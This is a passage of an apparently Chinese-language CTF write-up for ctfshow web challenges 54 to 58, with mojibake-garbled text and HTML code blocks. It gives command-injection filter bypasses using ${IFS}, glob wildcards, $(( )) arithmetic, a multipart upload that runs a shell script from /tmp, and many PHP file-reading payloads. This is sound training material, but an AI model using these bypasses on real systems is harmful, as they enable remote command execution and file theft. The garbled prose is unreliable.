id="web54">web54</span></h4><ul><li><p>æ–¹æ³•ä¸€</p><ul><li><p>å±è”½äº†å¤§å¤šæ•°linuxå‘½ä»¤ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨rev</p><p><code>/?c=rev$&#123;IFS&#125;fla?.php</code></p></li></ul></li><li><p>æ–¹æ³•äºŒ</p><ul><li><p>è™½ç„¶å±è”½äº†å¾ˆå¤šå‘½ä»¤ï¼Œä½†æ˜¯æˆ‘ä»¬åªéœ€åœ¨binç›®å½•è®©å‘½ä»¤è¡¥å…¨å°±å¯ä»¥äº†</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/?<span class="built_in">at</span>$&#123;IFS&#125;f???????</span><br><span class="line">/bin/c??$&#123;IFS&#125;????????</span><br></pre></td></tr></table></figure></li></ul></li><li><p>æ–¹æ³•ä¸‰</p><ul><li>ä¿®æ”¹flagçš„åå­—ï¼Œç„¶åç›´æ¥è®¿é—®ç½‘é¡µ</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;t.txt</span><br><span class="line">t.txt</span><br></pre></td></tr></table></figure></li></ul><h4><span id="web55">web55</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>æ–¹æ³•ä¸€</p><ul><li><p>è¿™é¢˜ç¦ç”¨äº† å­—æ¯ a-z ï¼Œé‚£ä¹ˆæˆ‘å¯ä»¥ç”¨ &#x2F;bin&#x2F;base64 flag.php</p><p>åŠ ä¸Šé€šé…ç¬¦ åˆ™ä¸º &#x2F;???&#x2F;????64 ????.??? ç„¶åä»–å°±ä¼šå‡ºç° flag.phpå†…å®¹çš„<a href="https://so.csdn.net/so/search?q=base64%E7%BC%96%E7%A0%81&spm=1001.2101.3001.7020">base64ç¼–ç </a></p></li></ul></li><li><p>æ–¹æ³•äºŒï¼š</p><ul><li><p>è¿˜æœ‰ä¸€ç§åšæ³•ï¼Œå°±æ˜¯ä½¿ç”¨ &#x2F;usr&#x2F;bin&#x2F;bzip2 è¿›è¡Œå¯¹æ–‡ä»¶çš„å‹ç¼©</p><p>åŒæ ·æ˜¯ä½¿ç”¨é€šé…ç¬¦è¿›è¡Œ<a href="https://so.csdn.net/so/search?q=payload&spm=1001.2101.3001.7020">payload</a>ï¼Œ ç„¶å æœ€åè®¿é—® &#x2F;flag.php.bz2è¿›è¡Œä¸‹è½½å‹ç¼©åŒ…</p><p><code>?c=/???/???/????2%20????.???</code></p></li></ul></li><li><p>æ–¹æ³•ä¸‰ï¼š</p><p>å‰ææ˜¯ é¢˜ç›®æ²¡æœ‰è¿‡æ»¤ ? &#x2F; . (é—®å·ï¼Œæ–œæ ,ç‚¹)ï¼Œå°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–¹æ³•è¿›è¡Œ<a href="https://so.csdn.net/so/search?q=RCE&spm=1001.2101.3001.7020">RCE</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">æ— å­—æ¯æ•°å­—webshell</a></p><p><img src="/2023/04/19/ctfshow-Web%E7%AF%87/a827f363-7520-4fe9-aac1-b8ceba21a1f3.5be5b8cfbacc.png" alt="globé€šé…ç¬¦"></p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POSTæ•°æ®åŒ…POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://43546a81-d8c7-4242-a8ea-dde142ff1d80.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>æ–‡ä»¶åï¼š<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æäº¤&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æœ¬åœ°è®¿é—®å¹¶<a href="https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&spm=1001.2101.3001.7020">æŠ“åŒ…</a>ï¼Œä¸Šä¼ 1.php å†™å…¥</p><p><img src="/2023/04/19/ctfshow-Web%E7%AF%87/c51ed151f2784287b539732dd5ff2699.png" alt="burpsuit"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">POST /?c=.%<span class="number">20</span>/???/????????[@-[] HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">6</span>fcec0ba-d4db-<span class="number">470</span>e-b611-<span class="number">1</span>f5455fea91c.challenge.ctf.show</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: <span class="number">319</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">sec-ch-ua: <span class="string">&quot;.Not/A)Brand&quot;</span>;v=<span class="string">&quot;99&quot;</span>, <span class="string">&quot;Google Chrome&quot;</span>;v=<span class="string">&quot;103&quot;</span>, <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;103&quot;</span></span><br><span class="line">sec-ch-ua-mobile: ?<span class="number">0</span></span><br><span class="line">sec-ch-ua-platform: <span class="string">&quot;macOS&quot;</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: <span class="literal">null</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaq9iIs9BT90tIPe6</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10_15_7</span>) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">103.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Sec-Fetch-Site: cross-site</span></span><br><span class="line"><span class="comment">Sec-Fetch-Mode: navigate</span></span><br><span class="line"><span class="comment">Sec-Fetch-User: ?1</span></span><br><span class="line"><span class="comment">Sec-Fetch-Dest: document</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryaq9iIs9BT90tIPe6</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;</span></span><br><span class="line"><span class="comment">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">##/bin/sh</span></span><br><span class="line"><span class="comment">cat flag.php.bz2</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryaq9iIs9BT90tIPe6</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Ã¦ÂÂÃ¤ÂºÂ¤</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryaq9iIs9BT90tIPe6--</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##/bin/sh</span></span><br><span class="line">cat  /<span class="keyword">var</span>/www/html/flag.php</span><br><span class="line"><span class="comment"># å› ä¸ºä¸Šä¼ çš„æ–‡ä»¶åœ¨tmpç›®å½•ä¸‹</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç›®å½•æ˜¯&#x2F;tmpï¼Œç„¶åä¸€èˆ¬ç½‘é¡µæ–‡ä»¶ä¼šå‘½åä¸ºphp??????ï¼Œåé¢æ˜¯éšæœºçš„å­—æ¯ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦è§„å®šä¸€ä¸ªèŒƒå›´[@-[],ä»@-[å°±æ˜¯26ä¸ªå­—æ¯</p><p>ç„¶åå…³äºä¸Šä¼ æ–‡ä»¶çš„å†…å®¹ã€‚æ—¢ç„¶è¦è®©æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶èƒ½æ‰§è¡Œæˆ‘ä»¬çš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬æ·»åŠ å†…å®¹&#x2F;bin&#x2F;sh</p><p>å› ä¸ºlinuxç³»ç»Ÿä¸‹ä¸€åˆ‡çš†æ–‡ä»¶ï¼Œæ‰€ä»¥ä¸€äº›ä¸ªå†…ç½®ç¨‹åºéƒ½æ˜¯ç”±æ–‡ä»¶ç»„æˆçš„ã€‚</p><p>&#x2F;binç›®å½•ä¸‹å­˜æ”¾çš„éƒ½æ˜¯åè®®shellè„šæœ¬çš„å†…å®¹ï¼Œshå°±æ˜¯æ‰§è¡Œshellè„šæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºæ‰“å¼€ç»ˆç«¯ã€‚åªæœ‰æ‰“å¼€ç»ˆç«¯æˆ‘ä»¬å†èƒ½è¾“å…¥å‘½ä»¤å¯¹å§</p><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥åœ¨æ–‡ä»¶é‡Œé¢åœ¨æ·»åŠ ls,catç­‰ä¸€ç³»åˆ—è¯»å–æ–‡ä»¶çš„å‘½ä»¤äº†ã€‚</p><p>é‚£ä¹ˆè¿˜å·®æœ€åä¸€æ­¥ã€‚æˆ‘ä»¬ä¸Šä¼ äº†è¿™ä¸ªæ–‡ä»¶åé‚£ä¹ˆå®ƒæ˜¯å­˜æ”¾åœ¨&#x2F;tmpç›®å½•ä¸‹çš„æŸä¸€ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯å®ƒåªæ˜¯å­˜æ”¾åœ¨äº†é‚£é‡Œï¼Œå¹¶ä¸ä¼šè¢«æ‰§è¡Œã€‚</p><p>è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥æ—¶å€™ç‚¹å‘½ä»¤ï¼Œè€Œæ­£å¥½é¢˜ç›®å¹¶æ²¡æœ‰è¿‡æ»¤ç‚¹å‘½ä»¤ï¼Œç‚¹å‘½ä»¤å°±æ˜¯æ‰§è¡Œshellè„šæœ¬</p><p>æ‰€ä»¥æˆ‘ä»¬æŠ“åŒ…ï¼Œç„¶åæ„é€ </p><p><strong>æœ‰æ¦‚ç‡å¤±è´¥ï¼Œå¤±è´¥é‡è¯•å³å¯ï¼Œå› ä¸ºæœ€åä¸€ä¸ªå­—æ¯ä¸ä¸€å®šæ˜¯å¤§å†™çš„ï¼Œè®°å¾—ä¿®æ”¹å³ä¸Šè§’çš„portä¸º80ï¼Œç„¶åhttpså…³äº†</strong></p><h4><span id="web57">web57</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°é¢˜ç›®å‘Šè¯‰æˆ‘ä»¬flagå†36.phpæ–‡ä»¶é‡Œé¢ï¼Œå¹¶ä¸”systemå‡½æ•°å·²ç»åŒ…å«äº†catå’Œphp</p><p>ä¹Ÿå°±æ˜¯è¯´åªè¦æˆ‘ä»¬ä¼ å‚ä¸€ä¸ª36å°±å¯ä»¥ </p><p>ä½†æ˜¯æ•°å­—è¢«è¿‡æ»¤æ‰äº†</p><p>è¿™æ—¶å€™å°±è¦ç”¨åˆ°ä¸€ä¸ªlinuxé‡Œé¢çš„å…³äº$çš„ç‰¹æ€§</p><p>$(())ä»£è¡¨ç®—æ•°è¿ç®—ï¼Œä¸¾ä¸ªæ —å­ï¼ša&#x3D;1,b&#x3D;2</p><p>$a+$bå°±ç­‰åŒäº$((1+2))</p><p>ç„¶åå› ä¸ºé¢˜ç›®æ— æ³•ä¼ é€’æ•°å­—ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ç”¨åˆ°å–åè¿ç®—</p><p>ä¸‹é¢æˆ‘åœ¨çº¢å¸½ä¸‹é¢æ¼”ç¤ºä¸€ä¸‹è¿™ä¸ªæ­¥éª¤</p><p>é¦–å…ˆè¦çŸ¥é“çš„æ˜¯å½“$(())æ²¡æœ‰å‚æ•°æ—¶ã€‚é»˜è®¤ä¸º0</p><p>æ‰€ä»¥å…¶å®è¯´åˆ°è¿™é‡Œå¤§å®¶ä¹Ÿéƒ½ç›´åˆ°äº†ï¼Œ0çš„å–åä¸º-1ï¼Œç„¶ååªè¦ä¸€ç›´è¿™æ ·ç›¸åŠ å†å–åå°±èƒ½å¾—åˆ°36ï¼ˆå› ä¸ºé¢˜ç›®è¿‡æ»¤äº†ä¹˜å·ï¼Œæ²¡æœ‰è¿‡æ»¤åŠ å·ï¼‰</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))))))</span><br><span class="line"># $&#123;_&#125; =&quot;&quot; //è¿”å›ä¸Šä¸€æ¬¡å‘½ä»¤</span><br><span class="line">$(($&#123;_&#125;))=<span class="number">0</span></span><br><span class="line">$((~$(($&#123;_&#125;))))=-<span class="number">1</span></span><br><span class="line">$((~$(())~$(()))) = -<span class="number">1</span>-<span class="number">1</span>=-<span class="number">2</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç”¨pythonæ„é€ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="string">&quot;$((~$((&quot;</span>+<span class="string">&quot;$((~$(())))&quot;</span>*<span class="number">37</span>+<span class="string">&quot;))))&quot;</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure><h4><span id="web58">web58</span></h4><p>Â·Â·Â·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>); <span class="comment">// éphpä»£ç </span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$filename</span>); <span class="comment">// éphpä»£ç </span></span><br><span class="line"><span class="keyword">require</span>(<span class="variable">$filename</span>); <span class="comment">// éphpä»£ç </span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="variable">$filename</span>); <span class="comment">// éphpä»£ç </span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬å…ˆè¦è·å–å½“å‰ç›®å½•ï¼Œç„¶åè¯»å–æ–‡ä»¶å†…å®¹</span></span><br><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>))));ã€€ã€€<span class="comment">// .ä¸ºå½“å‰ç›®å½•ï¼Œ..ä¸ºä¸Šçº§ç›®å½•ï¼Œscandir(&quot;.&quot;)è¯»å‡ºçš„æ•°ç»„ä¸º .. . flag.php index.php</span></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>))));</span><br><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">glob</span>(<span class="string">&quot;*&quot;</span>)));ã€€ã€€<span class="comment">//glob(&quot;*&quot;)è¯»å‡ºæ•°ç»„ä¸º flag.php  index.php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//è¿™é‡Œæˆ‘ä»¬çŸ¥é“ /var/www/html/ ç›®å½•ä¸­åªæœ‰ index.php å’Œ flag.php ä¸¤ä¸ªæ–‡ä»¶ï¼Œå› æ­¤ç›´æ¥è¯»å–flag.php</span></span><br><span class="line"><span class="comment">//ç›´æ¥è¯»å–æ–‡ä»¶å†…å®¹</span></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;falg.php&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//å…ˆè¯»å–ï¼Œå†è¾“å‡ºï¼Œä¸‹åˆ—éœ€è¦å³å‡»æŸ¥çœ‹æºä»£ç </span></span><br><span class="line">c=<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">php_strip_whitespace</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgets</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&quot;r&quot;</span>))); <span class="comment">// è¯»å–ä¸€è¡Œ</span></span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgetcsv</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;flag.php&#x27;</span>,<span class="string">&quot;r&quot;</span>), <span class="number">1000</span>));<span class="comment">// è¯»å–ä¸€è¡Œ</span></span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fscanf</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>, <span class="string">&quot;r&quot;</span>),<span class="string">&quot;%s&quot;</span>));<span class="comment">// è¯»å–ä¸€è¡Œ</span></span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgetss</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&quot;r&quot;</span>))); <span class="comment">// ä»æ–‡ä»¶æŒ‡é’ˆä¸­è¯»å–ä¸€è¡Œå¹¶è¿‡æ»¤æ‰ HTML æ ‡è®°</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_ini_file</span>(<span class="string">&#x27;flag.php&#x27;</span>)); <span class="comment">// å¤±è´¥æ—¶è¿”å› false , æˆåŠŸè¿”å›é…ç½®æ•°ç»„</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//éœ€è¦å…ˆæ‰“å¼€æ–‡ä»¶ï¼Œå†è¯»å–å†…å®¹ï¼Œæœ€åè¾“å‡º</span></span><br><span class="line">c=<span class="title function_ invoke__">fpassthru</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;flag.php&#x27;</span>,<span class="string">&#x27;r&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fread</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;flag.php&#x27;</span>,<span class="string">&#x27;r&#x27;</span>),<span class="number">1000</span>));</span><br><span class="line"> </span><br><span class="line"><span class="comment">//æ–‡ä»¶åŒ…å«ï¼Œåé¢var_dump(get_defined_vars());å¯ä»¥ä¸å†™</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_defined_vars</span>());</span><br><span class="line">c=<span class="keyword">include_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_defined_vars</span>());</span><br><span class="line">c=<span class="keyword">require_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_defined_vars</span>());</span><br><span class="line">c=<span class="keyword">require</span>(<span class="string">&#x27;flag.php&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_defined_vars</span>());</span><br><span class="line"><span class="comment"># å¯ä»¥ç”¨var_exportä»£æ›¿var_dump</span></span><br><span class="line"><span class="title function_ invoke__">var_export</span>(<span class="keyword">require</span>(<span class="string">&#x27;/flag.txt&#x27;</span>));</span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ–‡ä»¶</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">array_slice</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>),<span class="number">6</span>,<span class="number">1</span>)));ã€€ã€€<span class="comment">//è¿™é‡Œæä¾›ä¸€ç§æ€è·¯ï¼Œå½“flagè¢«å±è”½æ—¶ï¼Œphpä¸æ”¯æŒé€šé…ç¬¦ï¼Œsqlæ”¯æŒ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ–‡ä»¶åŒ…å«ä¼ é€’ä¼ªåè®®</span></span><br><span class="line">POST</span><br><span class="line">c=<span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="number">1</span>];</span><br><span class="line">GET</span><br><span class="line"><span 